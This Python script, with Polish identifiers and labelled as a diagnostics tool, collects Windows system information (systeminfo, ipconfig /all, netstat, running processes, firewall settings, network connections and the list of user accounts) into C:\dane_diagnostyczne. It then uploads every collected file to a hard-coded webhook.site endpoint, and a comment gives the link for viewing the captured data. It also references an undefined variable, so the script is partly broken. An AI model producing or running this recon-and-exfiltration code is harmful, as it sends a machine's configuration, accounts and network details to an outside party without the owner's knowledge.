import os
import subprocess
import requests



def wyslij_plik_do_webhooka(webhook_url, folder_path, file_name):
    file_path = os.path.join(folder_path, file_name)
    if os.path.exists(file_path):
        with open(file_path, 'rb') as file:
            file_data = file.read()
            files = {'file': (file_name, file_data)}
            response = requests.post(webhook_url, files=files)

def czy_znaleziono_folder(sciezka):
    return os.path.exists(sciezka)

def lista_plikow_w_folderze(folder_path):
    if os.path.exists(folder_path):
        files = os.listdir(folder_path)
        return files
    else:
        print(f'Folder {folder_path} nie istnieje.')
def usun_pliki_z_diagnozy():
    if czy_znaleziono_folder(SCIEZKA_DO_FOLDERU):
        os.system("del /q C:\\dane_diagnostyczne\\*.txt")
        print("Pliki z diagnozy zostały usunięte.")
    else:
        print("Folder 'dane_diagnostyczne' nie został znaleziony lub nie ma w nim plików.")


def uruchom_komende(komenda, nazwa_pliku):
    with open(nazwa_pliku, "w") as plik:
        subprocess.run(komenda, stdout=plik, stderr=subprocess.STDOUT, shell=True)


def run_powershell_command(command, output_file):
    powershell_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    full_command = f'"{powershell_path}" -Command "{command}"'

    with open(output_file, "w") as output:
        subprocess.run(full_command, stdout=output, stderr=subprocess.STDOUT, shell=True)


def main():
    if not czy_znaleziono_folder("c:\\dane_diagnostyczne"):
        os.mkdir("C:\\dane_diagnostyczne")

    usun_pliki_z_diagnozy()
    uruchom_komende("systeminfo", "C:\\dane_diagnostyczne\\info.txt")
    uruchom_komende("ipconfig", "C:\\dane_diagnostyczne\\ip.txt")
    uruchom_komende("ipconfig /all", "C:\\dane_diagnostyczne\\ip2.txt")
    run_powershell_command("Get-Process", "C:\\dane_diagnostyczne\\dane1.txt")
    run_powershell_command("Get-WmiObject Win32_PhysicalMemory", "C:\\dane_diagnostyczne\\dane2.txt")
    uruchom_komende("netstat", "C:\\dane_diagnostyczne\\net_test.txt")
    uruchom_komende("tasklist", "C:\\dane_diagnostyczne\\aktywneProgramy.txt")
    run_powershell_command("get-process", "C:\\dane_diagnostyczne\\id.txt")
    run_powershell_command("Get-NetAdapter", "C:\\dane_diagnostyczne\\kartysieciowe.txt")
    run_powershell_command("Get-NetConnectionProfile", "C:\\dane_diagnostyczne\\karty_bardziej_dokładnie.txt")
    run_powershell_command("Get-WmiObject -Class Win32_LogicalDisk", "C:\\dane_diagnostyczne\\dyski.txt")
    run_powershell_command("Get-NetTCPConnection", "C:\\dane_diagnostyczne\\ip3.txt")
    run_powershell_command("Get-NetUDPEndpoint", "C:\\dane_diagnostyczne\\ip4.txt")
    run_powershell_command("Get-NetFirewallSetting | Select-Object", "C:\\dane_diagnostyczne\\siec2.txt")
    run_powershell_command("Get-WmiObject -Class Win32_UserAccount", "C:\\dane_diagnostyczne\\użytkownicy.txt")

    # compressAndSend(folderPath, zipFileName, destinationIP);  funkcja od wysyłania


if __name__ == "__main__":
    main()
    webhook_url = "https://webhook.site/23b24b8d-4ef3-4e73-b9ad-ed17749b1e0d"
    folder_path = "C:\\dane_diagnostyczne"
    nazwy_plikow = lista_plikow_w_folderze(folder_path)
    if nazwy_plikow:
        for nazwa_pliku in nazwy_plikow:
            wyslij_plik_do_webhooka(webhook_url, folder_path, nazwa_pliku)


# link do webhooka do odczytu "https://webhook.site/#!/view/23b24b8d-4ef3-4e73-b9ad-ed17749b1e0d"